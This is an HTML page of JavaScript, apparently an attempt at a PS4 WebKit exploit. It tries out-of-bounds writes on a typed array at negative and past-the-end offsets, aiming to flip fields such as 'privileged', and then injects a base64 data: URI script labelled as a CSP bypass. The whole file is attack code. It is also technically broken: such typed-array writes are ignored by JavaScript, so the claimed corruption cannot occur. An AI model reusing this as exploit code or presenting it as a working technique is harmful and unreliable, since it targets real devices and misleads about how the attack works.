<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit OOB Write + CSP Bypass - Debug OOB Write</title>
    <style>
        body {
            font-family: monospace;
            white-space: pre-wrap;
        }
        #output {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            background-color: #f8f8f8;
        }
        .critical { color: magenta; font-weight: bold; }
        .warning { color: orange; }
        .success { color: green; }
        .error { color: red; }
        .info { color: blue; }
    </style>
</head>
<body>
    <h1>PS4 WebKit OOB Write + CSP Bypass - Debug OOB Write</h1>
    <div id="output"></div>
    <script>
        const log = (message, type = 'info') => {
            try {
                const outputDiv = document.getElementById('output');
                if (outputDiv) {
                    outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
                } else {
                    console.error('Elemento #output não encontrado!');
                }
            } catch (e) {
                console.error('Erro na função log:', e);
            }
        };

        function prepareData() {
            log("Função prepareData() iniciada.");
            const bufferSize = 64;
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);

            const targetObject = {
                flag1: true,
                flag2: false,
                counter: 10,
                name: "Test",
                array: [1, 2, 3],
                floatValue: 3.14,
                longValue: 1234567890123,
                nestedObject: { a: 1, b: "hello" },
                privileged: false,
                bypassMethod: "default"
            };

            log(`Objeto inicial: ${JSON.stringify(targetObject)}`);
            log(`Tamanho do buffer: ${bufferSize}`);
            log("Função prepareData() concluída.");
            return { targetObject, buffer, view, bufferSize };
        }

        async function targetedOOBWriteTests(targetObject, view, bufferSize) {
            log("\n--- Testes de OOB Write Direcionados ---", 'warning');

            const writeTargets = [
                { offset: -20, value: 0x01020304 },
                { offset: -12, value: 0x80808080 },
                { offset: 0, value: 0xAABBCCDD },
                { offset: 50, value: 0x11223344 },
                { offset: 60, value: 0xFFEEDDCC },
                { offset: 72, value: 0x12345678 },
                { offset: -1, value: 0x90 },
                { offset: bufferSize, value: 0xAA },
                { offset: -24, value: 0x00000001 },
                { offset: bufferSize + 16, value: 0x00000000 },
            ];

            const dataView = new DataView(view.buffer);

            for (const target of writeTargets) {
                const { offset, value } = target;
                log(`Tentativa de escrita em offset ${offset} com valor 0x${value.toString(16)}`);
                log(`Objeto ANTES da escrita: ${JSON.stringify(targetObject)}`);
                try {
                    if (offset >= 0 && offset + 3 < bufferSize && offset % 4 === 0) {
                        dataView.setInt32(offset, value, true);
                    } else if (offset >= 0 && offset < bufferSize) {
                        view[offset] = value & 0xFF;
                    } else {
                        view[offset] = value & 0xFF;
                    }
                    log(`Objeto APÓS a escrita: ${JSON.stringify(targetObject)}`);
                } catch (writeError) {
                    log(`Erro na escrita em offset ${offset}: ${writeError}`, 'error');
                }
                await new Promise(resolve => setTimeout(resolve, 50));
            }

            log("--- Testes de OOB Write Direcionados Concluídos ---", 'warning');
        }

        async function debugOOBWriteTest() {
            log("Iniciando teste de OOB Write...", 'critical');
            const { targetObject, buffer, view, bufferSize } = prepareData();
            await targetedOOBWriteTests(targetObject, view, bufferSize);
            log("Teste de OOB Write concluído.", 'critical');

            log("\n--- Tentativa de Bypass CSP (simples) ---", 'warning');
            try {
                const scriptDataURI = document.createElement('script');
                scriptDataURI.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgT09CIFdyaXRlIFRlc3QgQ29tcGxldGUhJyk7'; // alert('Vupun CSP Bypass! OOB Write Test Complete!');
                scriptDataURI.onload = () => log("Bypass de CSP (simples) BEM-SUCEDIDO!", 'success');
                scriptDataURI.onerror = () => log("Falha no Bypass de CSP (simples).", 'error');
                document.body.appendChild(scriptDataURI);
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                log(`Erro no bypass de CSP (simples): ${error}`, 'error');
            }
        }

        document.addEventListener('DOMContentLoaded', debugOOBWriteTest);
    </script>
</body>
</html>
